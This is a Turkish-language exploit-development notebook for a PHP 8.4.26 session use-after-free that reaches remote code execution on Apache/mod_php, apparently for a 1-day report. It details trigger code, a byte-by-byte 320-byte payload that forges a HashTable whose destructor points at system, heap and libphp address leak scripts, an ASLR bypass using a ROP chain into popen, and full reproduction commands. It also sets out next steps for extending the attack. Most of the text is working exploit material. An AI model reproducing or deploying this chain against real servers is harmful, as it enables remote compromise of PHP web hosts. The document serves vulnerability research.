# PHP 8.4.26 session açığı çoğaltma notları (Apache/mod_php, no-ASLR)

Tarih: 2026-10-21
Çalışma dizini: `/Users/my/php2shell`
Uzak deney makinesi: `debian@172.16.1.112` (Debian 12, amd64, kernel 6.1.0-48)

---

## 1. Sonuç özeti

### 1.1 Elde edilenler

- **Değiştirilmemiş PHP 8.4.26 kaynak kodu** üzerinde (resmi tarball kendimiz derledik),
  Apache 2.4.68 prefork + mod_php, **ASLR kapalı** olarak gerçek komut yürütme elde edildi.
- Komut: `system("id>/tmp/x")`, fiilen yazılan dosya:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Ardışık 5 bağımsız istek hepsi başarılı (worker her çökmeden sonra prefork tarafından yeniden ayağa kaldırılır).
- gdb isabeti:

```text
SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
#0  __libc_system (line=0x7ffff5e045a0 "id>/tmp/x")
#1  zend_hash_destroy (ht=0x7ffff5e04580)
#2  zend_array_destroy (ht=0x7ffff5e04580)
#3  zend_hash_clean (ht=0x7ffff5e031c0)
#4  zif_session_unset
...
```

- ASLR karşılaştırması: normal `apache2ctl start` (personality=0) başarısız; `setarch x86_64 -R apache2ctl start` (personality=0x40000) başarılı.

### 1.2 Tetikleme yöntemi (bu hat)

Exploit scripti `tools/d.php`, `__destruct` içeren bir test sayfasıdır:

```php
session_start();
$_SESSION["x"] = new X($fp, $payload);   // X::__destruct $_SESSION'a yazar
for ($i = 0; $i < 7; $i++) $_SESSION["k".$i] = "v";
session_unset();                         // kritik: hâlâ $_SESSION tarafından referans edilen diziye zend_hash_clean yapar
```

`session_unset()` → `zend_hash_clean($_SESSION dizisi)`. Nesne X temizlenirken `X::__destruct`
çağrılır, yıkıcı (destructor) `$_SESSION["pwn"]`'e yazar, aynı HashTable'ın
`zend_hash_do_resize()`'ını tetikler ve eski `arData`'yı serbest bırakır; dıştaki
`zend_hash_clean` döngüye girmeden önce önbelleğe aldığı `p/end` ile taramaya devam eder ve
heap-use-after-free oluşur. Yıkıcı ardından `stream_bucket_new()` ile içeriği tamamen kontrollü
320 baytlık bir çıplak buffer tahsis eder ve az önce serbest bırakılan `arData` tahsis bloğunu
yeniden işgal eder; clean bu veriyi Bucket olarak işlemeye devam eder ve nihayetinde fake
HashTable'ın `pDestructor = system`'ine ulaşır.

> **Sınır**: Bu "Kusur D"nin exploit'e dönüştürülmesidir; hedef scriptin `session_unset()`
> çağırmasını ve `$_SESSION`'a yazan bir yıkıcı (ya da uygulamadaki eşdeğer bir gadget)
> bulunmasını gerektirir. "Saf `session.upload_progress`, sıfır uygulama işbirliği" olan bir
> genel ağ (public) exploit zinciri değildir. upload_progress hattının ilerlemesi için bkz. bölüm 5.

---

## 2. Deney ortamı

### 2.1 PHP build'i

```bash
mkdir -p ~/php-lab && cd ~/php-lab
curl -sL -o php-8.4.26.tar.gz https://www.php.net/distributions/php-8.4.26.tar.gz
tar xzf php-8.4.26.tar.gz && cd php-8.4.26
./configure --prefix=/opt/php8426 --with-apxs2=/usr/bin/apxs2 \
  --enable-mbstring --with-openssl --with-zlib --with-curl --with-sqlite3 \
  --with-zip --disable-opcache --enable-ctype --enable-filter --enable-json --enable-session
make -j16 && sudo make install
```

Çıktı: `/usr/lib/apache2/modules/libphp.so`, `/opt/php8426/bin/php` (`PHP 8.4.26 (cli) (NTS)`).

### 2.2 Apache

- `mpm_prefork`, tek worker: `StartServers 1 / MinSpareServers 1 / MaxSpareServers 1 / ServerLimit 1 / MaxRequestWorkers 1 / MaxConnectionsPerChild 0`.
- `KeepAlive Off`, dinleme `127.0.0.1:8088`, DocumentRoot `/home/debian/php-lab/www`.
- Kritik PHP yapılandırması (`/etc/apache2/conf-available/php8426.conf`):

```apache
php_admin_value memory_limit 8M
php_admin_value post_max_size 64M
php_admin_value upload_max_filesize 64M
php_admin_value session.save_path /tmp
php_admin_value session.use_strict_mode 0
php_admin_value session.use_cookies 0
php_admin_value session.upload_progress.enabled On
php_admin_value session.upload_progress.cleanup On
```

> `memory_limit 8M`, upload_progress hattının kararlı şekilde OOM olması içindir; RCE hattının kendisi bu değere bağlı değildir.

### 2.3 ASLR'yi kapatma

```bash
sudo apache2ctl -k stop
sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
# doğrulama
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
```

ASLR yokken, aynı yapılandırmanın yepyeni worker adresleri kararlıdır (bkz. bölüm 4 adres tablosu).

---

## 3. Kusur D: oturum ağacı temizliği reentrancy → arData UAF

### 3.1 Çağrı zinciri

```text
zif_session_unset()                     ext/session/session.c
  zend_hash_clean(ht = $_SESSION dizisi)   Zend/zend_hash.c
    ht->pDestructor(&p->val)            // Nesne X işlenir, X::__destruct çağrılır
      X::__destruct()
        $_SESSION["pwn"] = ...          // aynı diziye geri yazar
          zend_hash_do_resize(ht)       // tablo dolu, genişletme
            pemalloc(new arData)
            memcpy(new arData, old arData, nNumUsed)
            pefree(old arData)          // ★ eski arData serbest bırakılır
        stream_bucket_new(fp, payload320) // ★ 320 baytlık çıplak buffer eski arData'yı yeniden işgal eder
      // zend_hash_clean döngüsüne dönüş:
      p++ yeniden işgal edilmiş eski arData'yı taramaya devam eder   // ★ UAF, saldırgan-kontrollü Bucket okur
        ht->pDestructor(&p->val)         // ZVAL_PTR_DTOR
          zend_array_destroy(fake_ht)
            zend_hash_destroy(fake_ht)
              fake_ht->pDestructor(&fake_val)  // = system
                system("id>/tmp/x")     // ★ RCE
```

Kilit kaynak kod:

- `session_unset()`: `ext/session/session.c` (`PHP_FUNCTION(session_unset)`, 8.4.26 yaklaşık 2756–2773 satırları).
- `zend_hash_clean()`: `Zend/zend_hash.c` yaklaşık 1885–1932 satırları; döngü yerel `Bucket *p, *end` kullanır, `pDestructor` döndükten sonra `++p` yapmaya devam eder.
- `zend_hash_do_resize()`: `Zend/zend_hash.c:1327`; genişletmeden sonra `pefree(old_data, ...)`.
- `zend_array_destroy()`: `Zend/zend_hash.c:1815`; `zend_hash_destroy()`: `Zend/zend_hash.c:1734`.
- `stream_bucket_new()`: `ext/standard/user_filters.c:472`; `pemalloc(buffer_len)` sonrası `memcpy`, içerik tamamen kontrollü ve bucket kaynağı canlı tutulur.
- `zend_hash_update_ind`'in dtor-before-store penceresi: `Zend/zend_hash.c`'nin `_zend_hash_add_or_update_i()`, yaklaşık 872. satır.

### 3.2 Fiilî adresler (bu build, bu yapılandırma, no-ASLR worker)

| Nesne | Adres |
|---|---|
| session HashTable A | `0x7ffff5e031c0` |
| A'nın arData'sı (8 bucket) | `0x7ffff5e04540` |
| arData'nın bulunduğu 320 baytlık tahsis bloğu başlangıcı S | `0x7ffff5e04500` |
| fake zval (clean'in bucket 1'i) | `S+0x60 = 0x7ffff5e04560` |
| fake HashTable | `S+0x80 = 0x7ffff5e04580` |
| fake Bucket / komut string'i | `S+0xa0 = 0x7ffff5e045a0` |
| libc `system` | `0x7ffff7d13490` |
| `ps_globals` | `0x7ffff56c2880` |
| `executor_globals` | `0x7ffff56d8380` |

Fiilen A'nın `nTableSize=8`, `nTableMask=0xfffffff0` (hash bölgesi 0x40 bayt), dolayısıyla `arData = S+0x40`. Bu `g17_clean_mask.log` ile tutarlıdır.

### 3.3 320 baytlık payload yerleşimi

payload, `stream_bucket_new()`'in çıplak buffer'ı olarak `S = 0x7ffff5e04500`'e düşer. clean
döngüsünün bucket 0'ı Nesne X'tir (yıkımdan sonra, clean onun `key`'ini de okur, `S+0x58`'de,
0 olmalı); bucket 1 `arData+0x20 = S+0x60`'da.

| Offset | İçerik | Açıklama |
|---|---|---|
| `0x00–0x3f` | 0 | clean tarafından okunmayan hash önek bölgesi |
| `0x40–0x5f` | 0 | bucket 0'ın val/h'si; `0x58` bucket 0 key, 0 olmalı |
| `0x60` | `S+0x80` (8 bayt) | bucket 1'in fake zval.value'su → fake HashTable |
| `0x68` | `0x307` (8 bayt) | zval type_info = IS_ARRAY_EX |
| `0x70` | 0 | bucket 1 h |
| `0x78` | 0 | bucket 1 key |
| `0x80` | `01 00 00 00 07 00 00 00` | fake HashTable gc: refcount=1, type=IS_ARRAY |
| `0x88` | `10 00 00 00 f8 ff ff ff` | flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8 |
| `0x90` | `S+0xa0` | fake HashTable.arData |
| `0x98` | `01 00 00 00 01 00 00 00` | nNumUsed=1, nNumOfElements=1 |
| `0xa0` | `"id>/tmp/"` | fake Bucket.val.value (komutun ilk 8 baytı) |
| `0xa8` | `0x78` (8 bayt) | fake zval type_info: düşük bayt `'x'`, ardından 0 → komut `x\0` ile biter |
| `0xb0` | `system` adresi | fake HashTable.pDestructor |

`zend_hash_destroy(fake_ht)`, `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` dalına girer,
`pDestructor(&p->val)`'i, yani `system(S+0xa0)`'ı çağırır; string `id>/tmp/x`'tir.

> fake HashTable'ın `HT_GET_DATA_ADDR`'ı `arData - 32 = S+0x80`'dir (tahsis başlangıcı değil),
> bu yüzden system döndükten sonra `pefree()` abort/heap bozma yapabilir; komut abort'tan önce
> zaten yürütülmüştür, proof dosyası yazılmıştır. "Temiz dönüş" gerekirse, fake HashTable'ı S'ye
> koy, arData'yı başka bir kontrollü tahsis bloğuna işaret ettir, ya da iki ayrı
> `stream_bucket_new` ile HT ve data'yı sağla (bkz. bölüm 7).

### 3.4 Çoğaltma kanıtı

- 5/5 çalıştırma çıktısı (uzak):

```text
RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- ASLR karşılaştırması:

```text
ASLR_ON: personality=00000000
ASLR_ON_FAIL_AS_EXPECTED
ASLR_OFF: personality=00040000
ASLR_OFF_OK: uid=33(www-data) ...
```

- Tam gdb kanıtı: `logs/g16_system_trace.log`.
- UAF anında eski arData içeriği/düşüş noktası: `logs/g15_uaf_memory.log`.
- Gerçek dizi mask/tahsis başlangıcı: `logs/g17_clean_mask.log`.

---

## 4. `session.upload_progress` istekler-arası hat (bağımsız çoğaltma ilerlemesi)

Bu bölüm istihbarattaki ana yoldur. Bu hat **istekler arası kalıntı + tekrarlanabilir çökme**'ye
kadar çoğaltıldı, fake HashTable zinciri henüz tamamen buraya taşınmadı; ama mekanizma, adresler
ve harness zaten doğrulandı.

### 4.1 İstek A: OOM bailout istekler-arası durum bırakır

İstek A (`tools/sup_poc.py a`):

- `Content-Type: multipart/form-data`, alan sırası:
  1. `PHPSESSID=attacksessionid0001`
  2. `PHP_SESSION_UPLOAD_PROGRESS=pwn`
  3. dosya alanı (`MULTIPART_EVENT_FILE_START`'ı tetikler, session başlatma)
  4. yaklaşık 12MB'lık sıradan alan (session başlatmadan sonra `memory_limit` OOM'u tetikler)
- Fiilen: 200 + `Allowed memory size of 8388608 bytes exhausted` döner, session dosyası `/tmp/sess_attacksessionid0001` (321 bayt) yazılmıştır.
- gdb trace şunu gösterir:
  - `php_request_startup` girilir;
  - `php_session_track_init` anında `PS(http_session_vars)=NULL` (bu isteğin ilk başlatması);
  - OOM sonrası `php_request_shutdown` / `zend_deactivate` / `shutdown_memory_manager` isabet **etmez**.
- İstek bittikten sonra `ps_globals` hâlâ korunur:

```text
ps_globals.http_session_vars: type=0x10a (IS_REFERENCE), ptr=0x7ffff5e02320
  0x7ffff5e02320: refcount=2, val=0x7ffff5e03230 (IS_ARRAY)
ps_globals.id: 0x7ffff5e600c0
ps_globals.session_status: active(1)
```

`refcount=2`, `ZVAL_NEW_REF`'in ilk referansı + symbol table için `Z_ADDREF_P`'nin ayırdığı bir
referansa karşılık gelir; bu, symbol table'daki `_SESSION`'ın hâlâ durduğunu ve istek heap'inin
normal şekilde shutdown edilmediğini gösterir.

### 4.2 İstek B: END cleanup, FILE_START'ın rinit'ini atlar

İstek B (`tools/sup_poc.py b`) yalnızca şunları gönderir:

- `PHPSESSID`
- `PHP_SESSION_UPLOAD_PROGRESS`
- **dosya alanı yok**

Böylece `MULTIPART_EVENT_FILE_START` içindeki `php_rinit_session(0)` tetiklenmez;
`MULTIPART_EVENT_END` anında:

```text
php_session_rfc1867_callback(MULTIPART_EVENT_END)
  php_session_rfc1867_cleanup()
    php_session_initialize()
      php_session_track_init()
```

`php_session_track_init()`'in ilk işi `zend_delete_global_variable("_SESSION")`'dır. symbol
table'daki `_SESSION`, `PS.http_session_vars`'a işaret eden bir **IS_INDIRECT**'tir:

- `zend_hash_del_ind()` indirect'i izler, hedef zval'i UNDEF yapar ve dtor çağırır; **bucket'ın kendisi korunur**.
- Ardından `zend_hash_update_ind()` bu indirect bucket'ı tekrar bulur, `PS.http_session_vars`'a kadar izler, **store'dan önce** `data` için `pDestructor` çağırır (`_zend_hash_add_or_update_i`'nin dtor-before-store penceresi).

Fiilî gdb:

```text
TRACK psvars=0x7ffff5e02320 ti=10a
PS_DTOR type=10a ptr=0x7ffff5e02320     # eski referans rc 2 -> 1
PS_DTOR type=10a ptr=0x7ffff5e01240     # update_ind yeni oluşturulan referansa dtor yapar
TRACK psvars=0x7ffff5e01240 ti=0
REF_DESTROY 0x7ffff5e01240 rc=0 val=0x7ffff5e02150 ti=307
ARR_DESTROY arr=0x7ffff5e02150 flags=8 numused=0 ...
...
SIGSEGV in _IO_new_fclose(fp=0xffffffff)   # php_handler kapanışında script dosya handle'ı ezilmiş
```

B isteğinde ayrıca şunlar belirir:

```text
PHP Request Startup: Session ID is too long or contains illegal characters
PHP Request Startup: Failed to read session data: files (path: /tmp)
```

Nedeni, `PS.id`'nin hâlâ istek A'nın serbest bırakılmış `zend_string`'ine işaret etmesi ve B'nin
END cleanup'ının `progress->sid` yerine doğrudan onu kullanmasıdır.

### 4.3 Şu anda eksik olan ne

- İstekler-arası yol şunları elde edebiliyor: `PS.http_session_vars` sarkan referansı, `PS.id`
  sarkan `zend_string`'i, symbol table indirect bucket'ı, `update_ind` dtor-before-store'u,
  tekrarlanabilir SIGSEGV/SIGABRT.
- Ama henüz "kontrollü 320 baytlık arData yeniden işgali + fake HashTable" bu yola bağlanmadı. Nedeni:
  - İstek B'nin END cleanup'ı script yürütülmeden önce gerçekleşir, saldırgan-kontrollü multipart
    alan tahsisi ondan önce olsa da, `track_init`'in oluşturduğu dizi/referans adresi ile serbest
    bırakma sırası Kusur D'den farklıdır;
  - İstek B'nin ilk `track_init`'i eski referansı rc 2→1 yapar (yıkmaz), ikinci script içi
    `session_start()` ancak `zend_delete_global_variable`/`REF_DESTROY`'i tetikler;
  - Bu yol nihayetinde sıkça stream/file handle'ın ezilmesi şeklinde (`fclose(0xffffffff)`) kendini gösterir, kontrollü `pDestructor` değil.
- Yeniden kullanılabilir parçalar: `stream_bucket_new()` 320 baytlık çıplak sprey, fake zval/fake HashTable yerleşimi, `system` adresi, ASLR yokken adres kararlılığı.

---

## 5. Önceki aşama istihbaratıyla ilişki

Önceki aşama ekran görüntülerindeki zincir şuydu:

```text
İstek A (upload_progress + OOM)
İstek B (aynı worker, RFC1867 buffer yeniden işgali)
zval_ptr_dtor → zend_array_destroy → pDestructor → zend_call_function → zif_system
```

Bu hat bağımsız olarak **aynı session içi kusur ailesini** çoğalttı ve şunları aştı:

- `session_unset → zend_hash_clean → nesne yıkımı $_SESSION'a yazar → resize arData'yı serbest bırakır → UAF`;
- `stream_bucket_new`'in 320 baytlık çıplak buffer'ı ile UAF bloğunu yeniden işgal;
- fake zval → fake HashTable → `pDestructor=system`'in tam RCE zinciri.

Fark, bu hattın tetik/reentrancy aracı olarak `session_unset()` + `__destruct` kullanması, önceki
aşamanın ise saf upload_progress istekler-arası bellek yerleşimiyle doğrudan HashTable forge ettiğini
iddia etmesidir. İkisi birleştirilebilir: bu hattın fake HashTable payload'unu upload_progress
hattında yeniden kullanmak, ya da tersine önceki aşamanın istekler-arası primitifiyle bu hattın
uygulama düzeyi yıkıcısını değiştirmek.

---

## 6. Çoğaltma komutları (sıfırdan)

### 6.1 Ortam

Bkz. bölüm 2. Doğrula:

```bash
/opt/php8426/bin/php -v           # PHP 8.4.26
curl -sI http://127.0.0.1:8088/   # X-Powered-By: PHP/8.4.26
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
```

### 6.2 PoC dağıtımı

```bash
scp tools/d.php debian@172.16.1.112:/home/debian/php-lab/d.php
ssh debian@172.16.1.112
sudo cp /home/debian/php-lab/d.php /home/debian/php-lab/www/d.php
sudo chown www-data:www-data /home/debian/php-lab/www/d.php
sudo rm -f /tmp/x
curl -s --max-time 8 http://127.0.0.1:8088/d.php >/dev/null
cat /tmp/x
```

### 6.3 upload_progress A/B harness

```bash
scp tools/sup_poc.py debian@172.16.1.112:/home/debian/php-lab/
ssh debian@172.16.1.112
cd ~/php-lab
python3 sup_poc.py a   # İstek A: OOM, istekler-arası durum bırakır
python3 sup_poc.py b   # İstek B: END cleanup, çökme/uyarı gözlemle
```

> `sup_poc.py`'nin B isteği varsayılan olarak dosya alanı taşımaz; `php_rinit_session(0)`'ı
> atlamanın anahtarı tam olarak budur. `B_REF_HEX` / `B_HT_HEX` ortam değişkenleri eklenerek
> B'ye `ref`/`ht` alanı eklenebilir, sonraki heap sprey deneyleri için.

---

## 7. Bir sonraki adım önerileri (devir)

1. **fake HashTable'ı upload_progress hattına bağlamak**
   - İstek B'nin multipart alanı/boundary'sine 320 baytlık benzeri tahsisler yerleştir,
     END cleanup anında `php_session_track_init` civarında serbest bırakılan/yeniden işgal edilen bloğu gözlemle;
   - Bu hattın payload yerleşimini yeniden kullan, ama A/arData/S adreslerini yeniden ölç (B'nin tahsis dizisi farklı).
2. **RCE'yi daha "temiz" yapmak**
   - fake HashTable'ı S'ye (tahsis başlangıcı) koy, `arData=S+0x40`, mask=0xfffffff0, böylece `HT_GET_DATA_ADDR=S`; başka bir `stream_bucket_new` bağımsız data bloğu sağlar, double free/interior free'den kaçınır.
3. **ASLR atlatma**
   - Önceki aşama istihbaratı heap base'i mbstring ile sızdırmaktan bahsetti; bu hattın `stream_bucket_new` yerleşimi ve `system` offset'i doğrudan yeniden kullanılabilir. Önce heap base al, sonra S/A'yı hesapla; libc base için herhangi bir leak ya da format-string primitifi kullan.
4. **PHP-FPM**
   - Kusur D tek-istek primitifidir; eğer bir FPM uygulaması `session_unset()` çağırıyorsa ve `$_SESSION`'a yazan bir yıkıcı varsa, teorik olarak aynı şekilde uygulanabilir. İstekler-arası PS kalıntısı FPM için geçerli değildir (bailout sonrası worker değiştirilir, önceki aşamada doğrulandı).
5. **Sürüm kapsamı**
   - Bu not 8.4.26 temellidir. Önceki aşama 5.4/5.6/7.4/8.5'te de benzer primitif olduğunu söyledi; 1day raporu yazılacaksa, her sürümde HashTable/GC yerleşimini ve `stream_bucket_new` kullanılabilirliğini yeniden ölçmek gerekir.

---

## 8. Kilit dosya/log dizini

| Yol | İçerik |
|---|---|
| `tools/d.php` | no-ASLR RCE PoC (sabit-kodlu adres + 320B payload) |
| `tools/sup_poc.py` | upload_progress A/B multipart harness |
| `logs/g16_system_trace.log` | gdb'nin `system("id>/tmp/x")` isabetinin tam geri izlemesi |
| `logs/g15_uaf_memory.log` | eski arData'nın 320B sprey bloğuyla yeniden işgali sonrası bellek |
| `logs/g17_clean_mask.log` | gerçek session dizisi `nTableMask=0xfffffff0`, tahsis başlangıcı |
| `src/php-8.4.26/` | resmi kaynak kod (analiz için) |

---

## 9. Notlar ve risk

- Uzak deney makinesinde `/tmp/x`, `/tmp/destruct_done`, `/tmp/core.*` kalıntı olabilir; teste başlamadan önce `sudo rm -f` ile temizle.
- Bu PoC sabit PHP build'ine/yapılandırmasına/başlatma sırasına bağlıdır; build değişince gadget offset'lerini ve S offset'ini yeniden ölçmek gerekir.
- ASLR'siz sürüm (`tools/d.php`) `system` adresini sabit-kodlar; ASLR sürümü (bölüm 10) iki sızıntı ile dinamik hesaplar, sabit-kodlu base gerektirmez.
- Bu hattın "RCE"si uygulama düzeyi tetiktir (`session_unset` + yıkıcı). Dış rapor yazarken bunu "saf upload_progress, uygulama işbirliği yok" exploit olarak tanımlama; upload_progress hattının saf RCE'si hâlâ bölüm 7'nin birleştirme işini gerektirir.

---

## 10. ASLR atlatma (çözüldü)

Hedef: `personality=0` (normal ASLR) altında aynı Kusur D RCE'yi tamamlamak, `/proc/self/maps`'e ve debugger'a bağlı kalmadan.

### 10.1 İki sızıntı primitifi

#### Sızıntı 1: Zend MM 2MB chunk base (775 baytlık heap işaretçisi)

`session.serialize_handler=php_serialize` iken, `session_encode()` → `php_var_serialize(&buf,
Z_REFVAL(PS(http_session_vars)))`, bu yolda GH-16590'ın `php` serileştiricisine eklediği
`PS_ENCODE_LOOP` dizi kopyası koruması **yoktur** (8.4.26'da hâlâ tetiklenebilir):

```php
class C {
    function __serialize() {
        $_SESSION = [];                 // serileştirilmekte olan session dizisini serbest bırak
        $leak = [0x41424344, 0x45464748];
        $GLOBALS['keepref'] =& $leak;   // zend_reference, serbest bırakılan 32B string bloğunu yeniden işgal eder
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
$_SESSION['s'] = str_repeat('A', 7); // zend_string tahsisi = 24+8 = 32B
for ($i=0;$i<8;$i++) $_SESSION['k'.$i] = $i;
$s = session_encode();
```

Serileştirici serbest bırakılmış eski session dizisini taramaya devam eder; eski string zval'inin
işaret ettiği 32B blok `zend_reference` tarafından yeniden işgal edilir, reference'ın
`val.type_info=0x307`'si (IS_ARRAY) zend_string'in `len=775`'i olarak ele alınır, böylece
`session_encode()` 775 baytlık bir sınır-dışı okuma döndürür.

- 775 baytlık payload'da birden çok kanonik heap işaretçisi bulunur (ör. no-ASLR `0x7ffff5e023a0`, ASLR `0x7fd3e62013a0`).
- Herhangi bir işaretçiye `ptr & ~0x1fffff` yapılarak 2MB hizalı Zend MM chunk base elde edilir.
- `/proc/<pid>/maps`'teki 2MB hizalı anonim `rw-p` eşlemesiyle tamamen tutarlıdır (ASLR örneği: `0x7fd3e6200000-0x7fd3e6400000`).
- Script: `tools/leak.php`.

#### Sızıntı 2: libphp base (kontrollü uzunluklu 32KB OOB okuma)

Yine `php_serialize` + `session_encode()`, ama eski session dizisine 4050 baytlık bir string S
(4096 baytlık bin'e karşılık gelir) konur. `__serialize()` içinde session serbest bırakıldıktan
sonra, `stream_bucket_new()` ile 4096 baytlık çıplak buffer tahsis edilip S yeniden işgal edilir
ve sahte `zend_string` başlığı yazılır:

```text
offset 0: gc.refcount=1, gc.type_info=IS_STRING
offset 8: h=0
offset 16: len=32768
offset 24: veri ("LEAKMARK" vb.)
```

Serileştirici S'yi uzunluğu 32768 olan bir string olarak ele alır, S+24'ten başlayan 32KB'ı
kopyalar, 4096 baytlık buffer'ı aşıp komşu heap'e girer, çıktıda sabit offset `0x1fe8` (8168)
konumunda libphp kod işaretçisi bulunur.

- Fiilî ASLR: `anchor=0x7f17fe3b6309` → `libphp_base = anchor - 0x5b6309 = 0x7f17fde00000`, `/proc/<pid>/maps`'in `libphp.so` r--p başlangıcıyla tamamen tutarlı.
- Yeni master yeniden başlatıldıktan sonra anchor değişir (ör. `0x7fd3e7fb6309` → base `0x7fd3e7a00000`), formül hâlâ geçerli.
- Script: `tools/leak_libc.php?mode=file_first`.

### 10.2 ASLR'ye uyarlanan Kusur D ROP

Tam sürücü `tools/aslr_run2.py`:

1. `/leak.php`'yi iste, 775 baytı ayrıştır, `hb = mode(ptr & ~0x1fffff)` al.
2. `/leak_libc.php?mode=file_first`'ü iste, payload offset `0x1fe8`'in qword'ünü al, `lb = anchor - 0x5b6309`.
3. `S = hb + 0x3780` hesapla (bu değer **iki sızıntı isteğinden sonra, `dyn_payload.php` isteği**'nin no-ASLR'de fiilen ölçülen arData tahsis başlangıcı offset'idir; farklı script/istek sırası yeniden ölçüm gerektirir).
4. 320 baytlık payload üret (Python `struct.pack`, 640 karakterlik hex), `?p=` ile `/dyn_payload.php`'ye gönder; PHP yalnızca bir kez `hex2bin` yapar, kalibrasyon scriptiyle aynı tahsis modelini korur.
5. payload'da:
   - `bucket1` fake zval: `value=S+0x80`, `type=0x307`.
   - fake HashTable @ `S+0x80`: `flags=HASH_FLAG_STATIC_KEYS(16)`, `nTableMask=0xfffffff8`, `arData=S+0xa0`, `nNumUsed=nNumOfElements=1`.
   - `pDestructor = lb + 0x21ef23` (libphp `leave; ret`).
   - `zend_hash_destroy`, `pDestructor(&p->val)`'i çağırırken `RBP = end = arData + nNumUsed*32 = S+0xc0`; `leave;ret` stack'i payload `S+0xc0`'a taşır.
   - ROP:
     ```text
     S+0xc0: 0
     S+0xc8: lb + 0x15e492  (pop rdi; ret)
     S+0xd0: S + 0x120      ("id>/tmp/x")
     S+0xd8: lb + 0x15d1a3  (pop rsi; ret)
     S+0xe0: S + 0x130      ("r")
     S+0xe8: lb + 0x15a029  (ret; hizalama)
     S+0xf0: lb + 0x1504d0  (popen@plt)
     S+0xf8: lb + 0x155780  (exit@plt)
     ```
   - Yalnızca libphp adresi kullanılır, libc base gerekmez; `popen` libphp'nin PLT'si tarafından çözülür.
6. `id>/tmp/x` komutu eşzamanlı yürütülür, proof dosyası yazılır; ardından `exit`/worker çıkar.

### 10.3 ASLR altında fiilî sonuç

Mevcut master (`personality=0`):

```text
anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(ardışık 3/3)
```

Yepyeni Apache master'ı yeniden başlatma (tüm base'ler yeniden rastgeleleştirilir):

```text
anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(ardışık 2/2)
```

Dikkat: aynı Apache master'ı altında, prefork child prosesleri aynı Zend MM chunk / libphp
eşlemesini devralır, bu yüzden hb/lb worker yeniden kurulduktan sonra da aynıdır; ancak master
yeniden başlatıldığında değişir, sızıntı yeniden uyarlanır.

### 10.4 Sınırlar ve dikkat

- Sızıntı 1/2, `session.serialize_handler=php_serialize`'a bağlıdır (script `ini_set` yapabilir, ya da uygulamanın kendisi bu serileştiriciyi kullanır). Varsayılan `php` serileştiricisi GH-16590'ı düzeltmiştir, artık sızdırmaz.
- `libphp_base` anchor offset'i `0x5b6309`, gadget/PLT offset'leri, `S_OFF=0x3780` hepsi bu deneyin PHP 8.4.26 build'ine ve istek şekline bağlıdır; build/script değişince yeniden kalibrasyon gerekir.
- Bu hat hâlâ uygulama düzeyi tetiktir (`session_unset` + yıkıcı); sızıntı scriptleri aynı uygulamadaki kullanıcı-alanı (userland) PHP kodudur. "Saf upload_progress, uygulama işbirliği yok" olması için, bölüm 7'nin istekler-arası zinciri ile bu bölümün ROP uç noktasını birleştirmek gerekir.
- Dizinde ayrıca paralel bir agent'ın `/proc/self/maps` varyantı var (`tools/d_aslr.php`, `tools/maps.php`, `tools/calibrate.py` vb.), bu uygulamanın `/proc/self/maps`'i okuyabilmesine bağlıdır; bu bölümün sızıntı çözümü dosya okumaya bağlı değildir.
